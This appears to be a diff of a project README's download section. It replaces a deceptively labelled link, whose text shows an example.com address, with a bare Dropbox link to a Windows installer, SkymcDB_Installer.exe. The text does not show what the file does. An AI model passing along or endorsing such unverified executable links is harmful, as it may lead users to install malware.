@@ -4,7 +4,7 @@
 
 ## 📦 Download
 
-📥 Download link: [[https://example.com/download ]()](https://www.dropbox.com/scl/fi/903uvypyu4trpcb5hmpla/SkymcDB_Installer.exe?rlkey=b5a5mkrbzsjgjzlbsccovzsxf&st=zytvdr11&dl=1)
+📥 Download link: https://www.dropbox.com/scl/fi/903uvypyu4trpcb5hmpla/SkymcDB_Installer.exe?rlkey=b5a5mkrbzsjgjzlbsccovzsxf&st=zytvdr11&dl=1
 
 ---
 
